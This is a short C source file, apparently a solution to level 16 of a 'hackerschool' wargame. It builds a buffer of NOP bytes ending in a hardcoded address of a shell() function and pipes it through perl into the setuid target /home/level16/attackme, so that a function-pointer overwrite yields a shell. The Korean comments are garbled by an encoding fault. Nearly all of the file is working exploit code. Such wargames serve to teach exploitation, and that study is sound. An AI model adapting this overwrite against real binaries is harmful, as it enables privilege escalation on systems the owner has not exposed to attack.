/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level16
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BUFSIZE 44   /* NOP(40) + &shell() */

// "shell() �Լ�" �� ���� �ּ�
char writecode[] = "\xd0\x84\x04\x08";

int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, shellLen;
    
    shellLen = strlen(writecode);

	// "void *call()" �Լ� �ձ����� NOP �� ä��
    for(i=0; i<sizeof(shellBuf)-shellLen; i++)
        shellBuf[i] = NOP;
    
	// "printit() �Լ��� ���� �ּҸ� "shell() �Լ�" �� ���� �ּҷ� ���
    for(j=0; j<shellLen; j++)
        shellBuf[i++] = writecode[j];
    
    // ���� ��ɾ� ����
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level16/attackme");
    strcat(cmdBuf, "\x0a");
    system(cmdBuf);
}